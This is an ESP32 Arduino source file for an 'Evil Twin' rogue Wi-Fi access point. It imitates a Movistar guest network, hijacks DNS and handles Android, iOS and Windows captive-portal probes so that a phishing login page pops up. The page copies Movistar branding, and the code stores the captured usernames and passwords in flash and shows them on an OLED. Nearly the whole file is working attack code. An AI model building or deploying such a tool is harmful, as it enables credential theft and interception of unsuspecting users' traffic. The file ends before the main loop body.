/*
================================================================================
EVIL TWIN APSTA - REPETIDOR REAL + MITM v5.0
Autor     : Deyni - Sociedad Científica UMSS San Simón
================================================================================
CÓMO FUNCIONA:
  1. ESP32 se conecta a ZTE_2.4Ghost-EXT (red real) como STA
  2. ESP32 crea red falsa MOVISTAR_Guest como AP
  3. ip_napt_enable() activa NAT entre AP y STA
     → los clientes del AP tienen internet real (son enrutados por ESP32)
  4. DNS wildcard redirige todas las peticiones al portal cautivo
  5. Portal captura credenciales → las guarda en SPIFFS
  6. Tras captura, el cliente tiene internet real (MITM completo)

FLUJO MITM:
  Teléfono ──► MOVISTAR_Guest (AP falso)
                    │
               ESP32 (NAT)   ◄── intercepta tráfico HTTP
                    │
              ZTE_2.4Ghost-EXT ──► Internet

CAPTIVE PORTAL AUTO-POPUP:
  - generate_204 / hotspot-detect / ncsi → respuestas de portal
  - Al conectar al AP, el OS muestra notificación automática
================================================================================
*/


#include <WiFi.h>
#include <WebServer.h>
#include <WiFiUdp.h>          // DNS forwarder propio (secuestro / reenvio)
#include <SPIFFS.h>
#include <WiFiClient.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>   // pantalla SH1106 (no SSD1306)
#include "lwip/lwip_napt.h"   // NAPT — requiere liblwip.a con NAPT compilado
#include "lwip/tcpip.h"       // LOCK_TCPIP_CORE / UNLOCK_TCPIP_CORE (IDF 5.x core-locking)

// ============================================================================
// CONFIGURACIÓN
// ============================================================================

// Credenciales de TU red real: viven en credenciales_wifi.h (NO se sube a git).
// Copia credenciales_wifi.ejemplo.h -> credenciales_wifi.h y pon tus datos.
#include "credenciales_wifi.h"

const char* SSID_REAL = SSID_REAL_CFG;
const char* PASS_REAL = PASS_REAL_CFG;

const char* SSID_FAKE = "MOVISTAR_Guest";
const char* PASS_FAKE = "12345678";

const IPAddress IP_AP  (192, 168, 4, 1);
const IPAddress GW_AP  (192, 168, 4, 1);
const IPAddress MASK_AP(255, 255, 255, 0);

// DNS real al que reenviar cuando el internet esta abierto (repetidor)
const IPAddress DNS_UPSTREAM(8, 8, 8, 8);

// Si true: el cliente tiene internet desde el inicio (repetidor puro, el portal
// no se fuerza). Si false: primero secuestra DNS (portal salta) y abre internet
// tras capturar credenciales. Cambia a true si solo quieres probar el enrutado.
#define ABRIR_INTERNET_AL_INICIO   true    // true = internet directo (la version que SI funciona)

// ============================================================================
// PINES
// ============================================================================

#define BUZZER_PIN  4
#define LED_R_PIN   5
#define LED_G_PIN   18
#define LED_B_PIN   19

// OLED SH1106 128x64 por I2C (SDA=21, SCL=22)
#define OLED_SDA    21
#define OLED_SCL    22
#define OLED_W      128
#define OLED_H      64
#define OLED_ADDR   0x3C

// ============================================================================
// ESTADO WIFI STA
// ============================================================================

enum EstadoSTA { STA_PENDIENTE, STA_CONECTANDO, STA_CONECTADO, STA_REINTENTANDO };

EstadoSTA     estadoSTA    = STA_PENDIENTE;
unsigned long tInicioSTA   = 0;
unsigned long tReintento   = 0;
bool          natActivo    = false;

#define STA_TIMEOUT_MS  20000
#define STA_RETRY_MS    12000

// ============================================================================
// GLOBALES
// ============================================================================

WebServer  server(80);
WiFiServer server443(443);

// DNS propio (puerto 53): modo secuestro (portal) o resolucion real (internet)
WiFiUDP    dnsUDP;                        // recibe consultas de los clientes
bool       secuestro_dns = true;          // true=portal (hijack), false=internet real
byte       dnsbuf[512];

// Cache DNS: evita llamar a hostByName (que bloquea) en dominios ya resueltos.
#define DNS_CACHE_N   24
struct DnsCache { char dom[40]; IPAddress ip; unsigned long expira; };
DnsCache   dnscache[DNS_CACHE_N];
int        dnscache_idx = 0;

bool dns_cache_buscar(const String& dom, IPAddress& ip) {
  for (int i = 0; i < DNS_CACHE_N; i++) {
    if (dnscache[i].dom[0] && dom == dnscache[i].dom && millis() < dnscache[i].expira) {
      ip = dnscache[i].ip;
      return true;
    }
  }
  return false;
}

void dns_cache_guardar(const String& dom, IPAddress ip) {
  DnsCache& e = dnscache[dnscache_idx];
  dom.toCharArray(e.dom, sizeof(e.dom));
  e.ip = ip;
  e.expira = millis() + 120000UL;          // 2 min
  dnscache_idx = (dnscache_idx + 1) % DNS_CACHE_N;
}

int           creds_count = 0;
unsigned long t_inicio    = 0;

// Última credencial capturada (para mostrarla en el OLED)
String        ultimo_user = "";
String        ultimo_pass = "";

// ============================================================================
// OLED + ESCANEO WIFI
// ============================================================================

Adafruit_SH1106G oled(OLED_W, OLED_H, &Wire, -1);
bool oledOK = false;

// Escaneo WiFi asíncrono (no bloqueante): resultados guardados para la pantalla
#define SCAN_MAX      8         // redes a mostrar como máximo
#define SCAN_PERIOD   30000     // relanzar escaneo cada 30s (bajo, para no tirar clientes del AP)

struct RedWifi { char ssid[20]; int rssi; int canal; };
RedWifi        redes[SCAN_MAX];
int            redes_n      = 0;
bool           scan_activo  = false;
unsigned long  t_scan       = 0;

// Rotación de pantallas del OLED: Estado MITM / Red real / Escaneo WiFi
enum PantallaOLED { PANT_DASHBOARD, PANT_REDREAL, PANT_SCAN, PANT_TOTAL };
int            pantalla     = PANT_DASHBOARD;
unsigned long  t_pantalla   = 0;
#define PANT_PERIOD   5000      // cambiar de pantalla cada 5s

// Alerta de credencial capturada: sobrepone una pantalla grande unos segundos
unsigned long  t_alerta     = 0;
#define ALERTA_MS     4000

// ============================================================================
// BUZZER / LED
// ============================================================================

void buzzer_beep(int ms) { digitalWrite(BUZZER_PIN, HIGH); delay(ms); digitalWrite(BUZZER_PIN, LOW); }
void buzzer_alerta() { buzzer_beep(100); delay(50); buzzer_beep(100); delay(50); buzzer_beep(100); }
void buzzer_ok()     { buzzer_beep(150); delay(80); buzzer_beep(500); }

void led_color(int r, int g, int b) {
  analogWrite(LED_R_PIN, r); analogWrite(LED_G_PIN, g); analogWrite(LED_B_PIN, b);
}
void led_verde()    { led_color(0,   255, 0);   }  // listo, sin STA
void led_azul()     { led_color(0,   0,   255); }  // STA conectando
void led_cyan()     { led_color(0,   255, 255); }  // MITM completo (NAT activo)
void led_amarillo() { led_color(255, 200, 0);   }  // cliente en AP
void led_rojo()     { led_color(255, 0,   0);   }  // credencial capturada
void led_apagar()   { led_color(0,   0,   0);   }

// ============================================================================
// SPIFFS
// ============================================================================

void inicializar_spiffs() {
  if (!SPIFFS.begin(true)) { Serial.println("[SPIFFS] ERROR"); return; }
  Serial.println("[SPIFFS] OK");
}

void guardar_credencial(String u, String p) {
  File f = SPIFFS.open("/credenciales.txt", "a");
  if (!f) return;
  f.print(u); f.print("|"); f.println(p);
  f.close();
  creds_count++;
  ultimo_user = u;
  ultimo_pass = p;
  t_alerta    = millis();   // dispara la alerta grande en el OLED
  secuestro_dns = false;    // abre internet real: el DNS pasa a reenvio (MITM completo)
  Serial.println("\n========== CREDENCIAL CAPTURADA ==========");
  Serial.print("  Usuario  : "); Serial.println(u);
  Serial.print("  Password : "); Serial.println(p);
  Serial.print("  Total    : "); Serial.println(creds_count);
  Serial.println("==========================================\n");
  buzzer_alerta();
  led_rojo();
  delay(800);
}

void leer_credenciales() {
  File f = SPIFFS.open("/credenciales.txt", "r");
  if (!f || f.size() == 0) { Serial.println("[SPIFFS] Vacío."); return; }
  Serial.println("\n===== CREDENCIALES =====");
  int n = 1;
  while (f.available()) {
    Serial.print("["); Serial.print(n++); Serial.print("] ");
    Serial.println(f.readStringUntil('\n'));
  }
  Serial.println("========================\n");
  f.close();
}

// ============================================================================
// OLED — inicialización, escaneo WiFi async y pantallas
// ============================================================================

void inicializar_oled() {
  Wire.begin(OLED_SDA, OLED_SCL);
  Wire.setClock(400000);   // 400kHz: refresco mas rapido
  oled.begin(OLED_ADDR, true);   // SH1106: begin(addr, reset)
  oledOK = true;
  oled.clearDisplay();
  oled.setTextColor(SH110X_WHITE);
  // Splash de arranque (128x64)
  oled.setTextSize(2);
  oled.setCursor(6, 8);
  oled.print("EVIL");
  oled.setCursor(6, 28);
  oled.print("TWIN");
  oled.setTextSize(1);
  oled.setCursor(0, 52);
  oled.print("MITM - UMSS S.Cient.");
  oled.drawRect(0, 0, OLED_W, OLED_H, SH110X_WHITE);
  oled.display();
  Serial.println("[OLED] OK (SH1106 128x64 @0x3C)");
}

// Lanza y recoge escaneos WiFi de forma no bloqueante (WiFi.scanNetworks async)
void gestionar_scan() {
  if (!scan_activo && millis() - t_scan > SCAN_PERIOD) {
    WiFi.scanNetworks(true, false);   // async=true, show_hidden=false
    scan_activo = true;
    t_scan = millis();
    return;
  }
  if (scan_activo) {
    int n = WiFi.scanComplete();
    if (n >= 0) {                     // escaneo terminado
      redes_n = (n > SCAN_MAX) ? SCAN_MAX : n;
      for (int i = 0; i < redes_n; i++) {
        String s = WiFi.SSID(i);
        if (s.length() == 0) s = "<oculta>";
        s.toCharArray(redes[i].ssid, sizeof(redes[i].ssid));
        redes[i].rssi  = WiFi.RSSI(i);
        redes[i].canal = WiFi.channel(i);
      }
      WiFi.scanDelete();
      scan_activo = false;
    }
  }
}

// ---- Helpers de dibujo ---------------------------------------------------

// Barra de señal (0-4 bloques) a partir del RSSI
int rssi_a_barras(int rssi) {
  if (rssi >= -55) return 4;
  if (rssi >= -65) return 3;
  if (rssi >= -75) return 2;
  if (rssi >= -85) return 1;
  return 0;
}

// Icono de 4 barras de señal; esquina inferior-izq en (x, y+8)
void icono_barras(int x, int y, int nivel) {
  for (int k = 0; k < 4; k++) {
    int bh = 2 + k * 2;
    int bx = x + k * 5;
    if (k < nivel) oled.fillRect(bx, y + 8 - bh, 3, bh, SH110X_WHITE);
    else           oled.drawRect(bx, y + 8 - bh, 3, bh, SH110X_WHITE);
  }
}

// Badge (etiqueta) invertida en una posicion dada
void oled_badge(int x, int y, const char* txt, bool activo) {
  int w = strlen(txt) * 6 + 4;
  if (activo) {
    oled.fillRect(x, y - 1, w, 10, SH110X_WHITE);
    oled.setTextColor(SH110X_BLACK);
  } else {
    oled.drawRect(x, y - 1, w, 10, SH110X_WHITE);
    oled.setTextColor(SH110X_WHITE);
  }
  oled.setCursor(x + 2, y);
  oled.print(txt);
  oled.setTextColor(SH110X_WHITE);
}

// Barra de título invertida (texto negro sobre blanco)
void oled_header(const char* titulo) {
  oled.fillRect(0, 0, OLED_W, 11, SH110X_WHITE);
  oled.setTextColor(SH110X_BLACK);
  oled.setTextSize(1);
  oled.setCursor(2, 2);
  oled.print(titulo);
  oled.setTextColor(SH110X_WHITE);
}

// ---- Pantalla 1: Estado MITM (128x64) -----------------------------------
void dibujar_dashboard() {
  oled.clearDisplay();
  oled_header("ESTADO MITM");

  // AP falso
  oled.setCursor(0, 14);
  oled.print("AP:");
  oled.print(SSID_FAKE);

  // Clientes conectados
  oled.setCursor(0, 24);
  oled.print("Clientes: ");
  oled.print(WiFi.softAPgetStationNum());

  // STA (red real): estado + barras de señal
  oled.setCursor(0, 34);
  if (estadoSTA == STA_CONECTADO) {
    oled.print("STA ");
    oled.print(WiFi.RSSI());
    oled.print("dBm");
    icono_barras(104, 33, rssi_a_barras(WiFi.RSSI()));
  } else if (estadoSTA == STA_CONECTANDO) {
    oled.print("STA: conectando..");
  } else {
    oled.print("STA: ---");
  }

  // NAT + estado de internet como badges
  oled.setCursor(0, 45);
  oled.print("NAT");
  oled_badge(24, 44, natActivo ? "ON" : "OFF", natActivo);
  oled_badge(60, 44, secuestro_dns ? "PORTAL" : "INTERNET", !secuestro_dns);

  // Credenciales capturadas
  oled.setCursor(0, 55);
  oled.print("Creds: ");
  oled.print(creds_count);

  oled.display();
}

// ---- Pantalla 2: Red real (STA) -----------------------------------------
void dibujar_red_real() {
  oled.clearDisplay();
  oled_header("RED REAL (STA)");

  oled.setCursor(0, 14);
  oled.print(SSID_REAL);

  if (estadoSTA == STA_CONECTADO) {
    oled.setCursor(0, 24);
    oled.print(WiFi.BSSIDstr());          // MAC del router real

    oled.setCursor(0, 34);
    oled.print("Canal:");
    oled.print(WiFi.channel());
    oled.setCursor(70, 34);
    oled.print(WiFi.RSSI());
    oled.print("dBm");
    icono_barras(110, 33, rssi_a_barras(WiFi.RSSI()));

    oled.setCursor(0, 44);
    oled.print("IP :");
    oled.print(WiFi.localIP());

    oled.setCursor(0, 54);
    oled.print("Up :");
    oled.print((millis() - t_inicio) / 1000);
    oled.print("s");
  } else {
    oled.setCursor(0, 30);
    oled.print("Sin conexion STA");
    oled.setCursor(0, 44);
    oled.print("Up :");
    oled.print((millis() - t_inicio) / 1000);
    oled.print("s");
  }
  oled.display();
}

// ---- Pantalla 3: Escaneo WiFi -------------------------------------------
void dibujar_scan() {
  oled.clearDisplay();
  char cab[22];
  snprintf(cab, sizeof(cab), "REDES WIFI (%d)", redes_n);
  oled_header(cab);

  if (redes_n == 0) {
    oled.setCursor(0, 26);
    oled.print(scan_activo ? "Escaneando..." : "Sin datos aun");
    oled.display();
    return;
  }

  int y = 13;
  int filas = (redes_n > 5) ? 5 : redes_n;   // hasta 5 filas visibles
  for (int i = 0; i < filas; i++) {
    oled.setCursor(0, y);
    char linea[13];
    strncpy(linea, redes[i].ssid, 12); linea[12] = 0;
    oled.print(linea);
    oled.setCursor(78, y);
    oled.print("c");
    oled.print(redes[i].canal);
    icono_barras(104, y, rssi_a_barras(redes[i].rssi));
    y += 10;
  }
  oled.display();
}

// ---- Overlay: alerta de credencial capturada (128x64) -------------------
void dibujar_alerta() {
  oled.clearDisplay();
  oled.drawRect(0, 0, OLED_W, OLED_H, SH110X_WHITE);
  oled.drawRect(2, 2, OLED_W - 4, OLED_H - 4, SH110X_WHITE);

  oled.setTextSize(2);
  oled.setCursor(10, 8);
  oled.print("CRED!");

  oled.setTextSize(1);
  // Usuario (recortado)
  oled.setCursor(8, 30);
  oled.print("U:");
  oled.print(ultimo_user.substring(0, 16));

  // Password parcialmente enmascarada
  oled.setCursor(8, 42);
  oled.print("P:");
  String p = ultimo_pass;
  String masc = p.substring(0, 2);
  for (int i = 2; i < (int)p.length() && i < 10; i++) masc += "*";
  oled.print(masc);

  oled.setCursor(8, 54);
  oled.print("Total: ");
  oled.print(creds_count);

  oled.display();
}

void gestionar_oled() {
  if (!oledOK) return;

  // Alerta grande tras capturar credencial: sobrepone unos segundos
  if (t_alerta != 0 && millis() - t_alerta < ALERTA_MS) {
    dibujar_alerta();
    return;
  }

  // Rotar de pantalla cada PANT_PERIOD
  if (millis() - t_pantalla >= PANT_PERIOD) {
    t_pantalla = millis();
    pantalla = (pantalla + 1) % PANT_TOTAL;
  }
  // Redibujar la pantalla actual
  switch (pantalla) {
    case PANT_REDREAL: dibujar_red_real(); break;
    case PANT_SCAN:    dibujar_scan();     break;
    default:           dibujar_dashboard();break;
  }
}

// ============================================================================
// HTML PORTAL
// ============================================================================

const char HTML_PORTAL[] PROGMEM = R"====(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>MOVISTAR - Iniciar sesión</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:linear-gradient(160deg,#009de0,#004a80);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.35);padding:40px 32px;max-width:400px;width:100%}
.logo{font-size:28px;font-weight:900;color:#009de0;text-align:center;margin-bottom:4px}
.logo span{color:#004a80}
.sub{text-align:center;color:#666;font-size:13px;margin-bottom:28px}
label{font-size:13px;font-weight:700;color:#444;display:block;margin-bottom:5px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:15px}
input:focus{outline:none;border-color:#009de0}
.btn{margin-top:22px;width:100%;padding:14px;background:#009de0;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}
.btn:hover{background:#004a80}
.ft{text-align:center;font-size:11px;color:#bbb;margin-top:20px}
</style>
</head>
<body>
<div class="c">
  <div class="logo">M <span>movistar</span></div>
  <div class="sub">Verifica tu identidad para continuar</div>
  <form method="POST" action="/submit">
    <label>Correo o usuario</label>
    <input type="text" name="usuario" placeholder="usuario@movistar.com" required autocomplete="off">
    <label>Contraseña</label>
    <input type="password" name="contrasena" placeholder="••••••••" required>
    <button class="btn" type="submit">Conectar</button>
  </form>
  <div class="ft">Red segura · Movistar Bolivia</div>
</div>
</body>
</html>
)====";

const char HTML_EXITO[] PROGMEM = R"====(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Conectado</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:linear-gradient(160deg,#009de0,#004a80);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.35);padding:40px 32px;max-width:400px;width:100%;text-align:center}
.ok{font-size:60px;margin-bottom:16px}
h2{color:#009de0;font-size:22px;margin-bottom:10px}
p{color:#666;font-size:14px;line-height:1.6}
.logo{font-size:20px;font-weight:900;color:#009de0;margin-top:24px}
.logo span{color:#004a80}
</style>
</head>
<body>
<div class="c">
  <div class="ok">&#10003;</div>
  <h2>Conectado a Internet</h2>
  <p>Sesión verificada.<br>Ya puedes navegar.</p>
  <div class="logo">M <span>movistar</span></div>
</div>
</body>
</html>
)====";

// ============================================================================
// HANDLERS HTTP
// ============================================================================

void log_req() {
  Serial.print("[HTTP] ");
  Serial.print(server.method() == HTTP_GET ? "GET " : "POST ");
  Serial.print(server.hostHeader());
  Serial.println(server.uri());
}

void send_redirect(const char* url) {
  server.sendHeader("Location", url, true);
  server.sendHeader("Cache-Control", "no-cache");
  server.send(302, "text/plain", "Redirect");
}

void handle_portal() {
  log_req();
  server.send_P(200, "text/html; charset=UTF-8", HTML_PORTAL);
}

void handle_submit() {
  if (server.method() != HTTP_POST) { handle_portal(); return; }
  String u = server.arg("usuario");
  String p = server.arg("contrasena");
  if (u.length() > 0 && p.length() > 0) {
    guardar_credencial(u, p);
    server.send_P(200, "text/html; charset=UTF-8", HTML_EXITO);
  } else {
    handle_portal();
  }
}

// Android generate_204: un 302 al portal es el disparador mas fiable del popup
void handle_gen204() {
  log_req();
  send_redirect("http://192.168.4.1/");
}

// iOS/macOS: NO devolver "<Success>" → activa el portal automático
void handle_hotspot() {
  log_req();
  server.send(200, "text/html", "<HTML><HEAD><TITLE>Captive</TITLE></HEAD><BODY>Captive</BODY></HTML>");
}

void handle_ncsi() {
  log_req();
  send_redirect("http://192.168.4.1/");
}

void handle_not_found() {
  log_req();
  send_redirect("http://192.168.4.1/");
}

// ============================================================================
// DNS PROPIO — secuestro (portal) o reenvio al DNS real (internet)
// ============================================================================

void dns_setup() {
  dnsUDP.begin(53);        // recibe consultas DNS de los clientes del AP
}

// Localiza el fin de la pregunta (tras QTYPE/QCLASS) y devuelve el dominio + tipo
int dns_fin_pregunta(byte* q, int qlen, String& dominio, int& qtype) {
  dominio = "";
  int i = 12;
  while (i < qlen && q[i] != 0) {
    int len = q[i]; i++;
    if (len <= 0 || i + len > qlen) return -1;
    if (dominio.length() > 0) dominio += ".";
    for (int j = 0; j < len; j++) dominio += (char)q[i + j];
    i += len;
  }
  if (i + 5 > qlen) return -1;          // 0x00 + QTYPE(2) + QCLASS(2)
  qtype = (q[i + 1] << 8) | q[i + 2];
  return i + 5;                          // indice de fin de la pregunta
}

// Construye y envia una respuesta DNS. Si con_ip, añade 1 registro A con 'ip'.
void dns_responder(IPAddress cip, uint16_t cport, byte* q, int qend, bool con_ip, IPAddress ip) {
  if (qend < 12 || qend > 500) return;
  static byte resp[512];
  memcpy(resp, q, qend);                 // cabecera + pregunta (sin EDNS/adicionales)
  resp[2] = 0x81; resp[3] = 0x80;        // flags: respuesta + RA
  resp[6] = 0x00; resp[7] = con_ip ? 1 : 0;  // ANCOUNT
  resp[8] = 0; resp[9] = 0; resp[10] = 0; resp[11] = 0;  // NSCOUNT/ARCOUNT = 0
  int i = qend;
  if (con_ip) {
    resp[i++] = 0xC0; resp[i++] = 0x0C;  // puntero al nombre de la pregunta
    resp[i++] = 0x00; resp[i++] = 0x01;  // tipo A
    resp[i++] = 0x00; resp[i++] = 0x01;  // clase IN
    resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x0A;  // TTL 10s (transicion rapida tras login)
    resp[i++] = 0x00; resp[i++] = 0x04;  // RDLENGTH 4
    resp[i++] = ip[0]; resp[i++] = ip[1]; resp[i++] = ip[2]; resp[i++] = ip[3];
  }
  dnsUDP.beginPacket(cip, cport);
  dnsUDP.write(resp, i);
  dnsUDP.endPacket();
}

void dns_loop() {
  int len = dnsUDP.parsePacket();
  if (len <= 0) return;
  IPAddress cip = dnsUDP.remoteIP();
  uint16_t  cport = dnsUDP.remotePort();
  int n = dnsUDP.read(dnsbuf, sizeof(dnsbuf));
  if (n <= 0 || n > 500) return;
  static byte q[512];
  memcpy(q, dnsbuf, n);

  String dominio; int qtype = 0;
  int qend = dns_fin_pregunta(q, n, dominio, qtype);
  if (qend < 0) return;

  if (secuestro_dns) {
    // Portal: cualquier nombre -> 192.168.4.1 (salta el portal cautivo)
    dns_responder(cip, cport, q, qend, true, IP_AP);
    return;
  }

  // Internet real: solo consultas A las resolvemos con el resolvedor del sistema
  if (qtype != 1) {                        // AAAA u otras -> respuesta vacia (usa A)
    dns_responder(cip, cport, q, qend, false, IP_AP);
    return;
  }
  IPAddress rip;
  if (dns_cache_buscar(dominio, rip)) {           // cache: respuesta instantanea
    dns_responder(cip, cport, q, qend, true, rip);
    return;
  }
  if (WiFi.hostByName(dominio.c_str(), rip) == 1) {
    dns_cache_guardar(dominio, rip);
    dns_responder(cip, cport, q, qend, true, rip);
    Serial.print("[DNS] "); Serial.print(dominio); Serial.print(" -> "); Serial.println(rip);
  } else {
    dns_responder(cip, cport, q, qend, false, IP_AP);   // no resuelto: vacio
  }
}

// ============================================================================
// PUERTO 443: NO escuchamos a proposito. Asi el sondeo HTTPS de Android recibe
// "conexion rechazada" rapido y CAE al sondeo por HTTP (puerto 80), que si
// respondemos con el portal -> dispara el popup "Iniciar sesion". Si aceptamos
// y cerramos el 443, Android lo ve "roto" y NO cae a HTTP (no salta el portal).
// ============================================================================

// ============================================================================
// INICIALIZACIÓN AP + SERVIDOR
// ============================================================================

// Eventos del AP: saber si un cliente se asocia o se cae (con MAC y motivo)
void wifi_event(WiFiEvent_t ev, WiFiEventInfo_t info) {
  if (ev == ARDUINO_EVENT_WIFI_AP_STACONNECTED) {
    Serial.printf("[AP] Cliente ASOCIADO %02x:%02x:%02x:%02x:%02x:%02x\n",
      info.wifi_ap_staconnected.mac[0], info.wifi_ap_staconnected.mac[1],
      info.wifi_ap_staconnected.mac[2], info.wifi_ap_staconnected.mac[3],
      info.wifi_ap_staconnected.mac[4], info.wifi_ap_staconnected.mac[5]);
  } else if (ev == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED) {
    Serial.printf("[AP] Cliente CAIDO %02x:%02x:%02x:%02x:%02x:%02x\n",
      info.wifi_ap_stadisconnected.mac[0], info.wifi_ap_stadisconnected.mac[1],
      info.wifi_ap_stadisconnected.mac[2], info.wifi_ap_stadisconnected.mac[3],
      info.wifi_ap_stadisconnected.mac[4], info.wifi_ap_stadisconnected.mac[5]);
  } else if (ev == ARDUINO_EVENT_WIFI_AP_STAIPASSIGNED) {
    Serial.print("[AP] IP entregada a cliente: ");
    Serial.println(IPAddress(info.wifi_ap_staipassigned.ip.addr));
  }
}

void inicializar_ap() {
  WiFi.onEvent(wifi_event);
  WiFi.mode(WIFI_AP_STA);

  // El ESP32 tiene UNA sola radio: AP y STA comparten canal. Si el AP arranca
  // en canal 1 y el STA engancha la red real en otro canal, el AP SALTA de canal
  // y tira a los clientes. Solucion: arrancar el AP en el mismo canal que la red real.
  int canal = 1;
  Serial.println("[AP] Escaneando canal de la red real...");
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    if (WiFi.SSID(i) == String(SSID_REAL)) { canal = WiFi.channel(i); break; }
  }
  WiFi.scanDelete();
  Serial.print("[AP] Canal de "); Serial.print(SSID_REAL);
  Serial.print(" = "); Serial.println(canal);

  WiFi.softAPConfig(IP_AP, GW_AP, MASK_AP);
  WiFi.softAP(SSID_FAKE, PASS_FAKE, canal);   // AP en el MISMO canal -> sin salto
  t_inicio = millis();
  Serial.print("[AP] Red activa: " + String(SSID_FAKE));
  Serial.print("  IP: 192.168.4.1  canal AP: ");
  Serial.println(WiFi.channel());
}

void inicializar_servidor() {
  server.on("/",                          HTTP_GET,  handle_portal);
  server.on("/submit",                    HTTP_POST, handle_submit);

  // Android (todas las versiones)
  server.on("/generate_204",              HTTP_GET,  handle_gen204);
  server.on("/gen_204",                   HTTP_GET,  handle_gen204);
  server.on("/generate204",               HTTP_GET,  handle_gen204);

  // iOS / macOS
  server.on("/hotspot-detect.html",       HTTP_GET,  handle_hotspot);
  server.on("/library/test/success.html", HTTP_GET,  handle_hotspot);

  // Windows
  server.on("/ncsi.txt",                  HTTP_GET,  handle_ncsi);
  server.on("/connecttest.txt",           HTTP_GET,  handle_ncsi);
  server.on("/redirect",                  HTTP_GET,  handle_gen204);

  server.onNotFound(handle_not_found);
  server.begin();
  // 443 a proposito SIN escuchar (ver nota arriba): fuerza el fallback a HTTP.
  dns_setup();
  secuestro_dns = !ABRIR_INTERNET_AL_INICIO;   // arranca en modo portal (hijack)

  Serial.println("[HTTP]  Puerto 80 OK");
  Serial.println("[HTTPS] Puerto 443 TCP raw OK");
  Serial.print("[DNS]   Propio OK - modo: ");
  Serial.println(secuestro_dns ? "SECUESTRO (portal)" : "REENVIO (internet)");
}

// ============================================================================
// NAT — activa enrutamiento real AP → Internet
// ============================================================================

// Auto-test: el ESP resuelve un dominio con el resolvedor propio del sistema
// (independiente del socket dnsFwd) para saber si tiene internet real de verdad.
void test_internet_esp() {
  IPAddress res;
  int ok = WiFi.hostByName("google.com", res);
  if (ok == 1) {
    Serial.print("[TEST] ESP internet OK - google.com = "); Serial.println(res);
  } else {
    Serial.println("[TEST] ESP SIN internet (hostByName fallo) ✗");
  }
}

void habilitar_nat() {
  // IDF 5.x (core 3.x) usa TCPIP core-locking: hay que tomar el candado
  // del núcleo lwIP antes de llamar a ip_napt_enable() desde el hilo Arduino,
  // o dispara: assert sys_timeout "Required to lock TCPIP core functionality!"
  LOCK_TCPIP_CORE();
  ip_napt_enable((uint32_t)IP_AP, 1);
  UNLOCK_TCPIP_CORE();
  natActivo = true;
  Serial.println("[NAT] ACTIVO — AP → Internet enrutado");
  Serial.print("[NAT] IP STA: "); Serial.println(WiFi.localIP());
  Serial.print("[NAT] Canal (AP y STA comparten): "); Serial.println(WiFi.channel());
  test_internet_esp();
}

// ============================================================================
// MÁQUINA DE ESTADOS WIFI STA
// ============================================================================

void manejar_wifi_sta() {
  switch (estadoSTA) {

    case STA_PENDIENTE:
      Serial.println("[STA] Iniciando WiFi.begin()...");
      WiFi.begin(SSID_REAL, PASS_REAL);
      tInicioSTA = millis();
      estadoSTA  = STA_CONECTANDO;
      if (!natActivo) led_azul();
      break;

    case STA_CONECTANDO:
      if (WiFi.status() == WL_CONNECTED) {
        estadoSTA = STA_CONECTADO;
        Serial.print("[STA] Conectado: "); Serial.println(WiFi.localIP());
        Serial.print("[STA] RSSI: "); Serial.print(WiFi.RSSI()); Serial.println(" dBm");
        buzzer_ok();
        habilitar_nat();
        led_cyan();
      } else if (millis() - tInicioSTA > STA_TIMEOUT_MS) {
        Serial.println("[STA] Timeout. Reintentando...");
        WiFi.disconnect();
        tReintento = millis();
        estadoSTA  = STA_REINTENTANDO;
        led_verde();
      }
      break;

    case STA_CONECTADO:
      if (WiFi.status() != WL_CONNECTED) {
        Serial.println("[STA] Señal perdida, reconectando...");
        natActivo = false;
        estadoSTA = STA_PENDIENTE;
        led_verde();
      }
      break;

    case STA_REINTENTANDO:
      if (millis() - tReintento > STA_RETRY_MS) estadoSTA = STA_PENDIENTE;
      break;
  }
}

// ============================================================================
// STATUS
// ============================================================================

void mostrar_estado() {
  Serial.println("\n========== STATUS ==========");
  Serial.print("AP Fake : "); Serial.print(SSID_FAKE);
  Serial.print("  Clientes: "); Serial.println(WiFi.softAPgetStationNum());
  Serial.print("STA     : ");
  if (estadoSTA == STA_CONECTADO) {
    Serial.print("CONECTADO "); Serial.println(WiFi.localIP());
  } else if (estadoSTA == STA_CONECTANDO) {
    Serial.println("Conectando...");
  } else {
    Serial.println("Desconectado");
  }
  Serial.print("NAT     : "); Serial.println(natActivo ? "ACTIVO (MITM)" : "INACTIVO");
  Serial.print("Creds   : "); Serial.println(creds_count);
  Serial.print("Uptime  : "); Serial.print((millis() - t_inicio) / 1000); Serial.println("s");
  Serial.println("============================\n");
}

// ============================================================================
//  S E T U P
// ============================================================================

void setup() {
  Serial.begin(115200);
  delay(300);
  Serial.println("\n\n=== Evil Twin MITM Repetidor v5.0 — UMSS San Simón ===\n");

  pinMode(BUZZER_PIN, OUTPUT);
  pinMode(LED_R_PIN,  OUTPUT);
  pinMode(LED_G_PIN,  OUTPUT);
  pinMode(LED_B_PIN,  OUTPUT);
  digitalWrite(BUZZER_PIN, LOW);
  led_apagar();

  inicializar_oled();
  inicializar_spiffs();
  inicializar_ap();
  inicializar_servidor();

  // LED verde inmediato — portal activo antes de que STA conecte
  led_verde();
  buzzer_beep(80); delay(80); buzzer_beep(80); delay(80); buzzer_beep(200);

  Serial.println("[OK] Portal activo: " + String(SSID_FAKE));
  Serial.println("[OK] WiFi.begin() arranca en loop() — sin bloqueos\n");
}

// ============================================================================
//  L O O P
// ============================================================================

unsigned long t_led    = 0;
unsigned long t_serial = 0;
unsigned long t_oled   = 0;

